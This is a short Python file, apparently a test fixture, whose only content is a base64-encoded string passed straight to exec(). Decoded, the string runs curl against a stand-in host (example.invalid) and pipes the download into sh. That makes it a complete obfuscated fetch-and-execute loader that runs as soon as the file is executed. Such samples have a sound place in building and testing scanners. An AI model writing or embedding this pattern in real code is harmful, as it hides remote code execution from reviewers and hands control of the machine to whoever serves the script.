import base64

PAYLOAD = "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgLXMgaHR0cHM6Ly9leGFtcGxlLmludmFsaWQveCB8IHNoJykgICMgZml4dHVyZQ=="
exec(base64.b64decode(PAYLOAD))
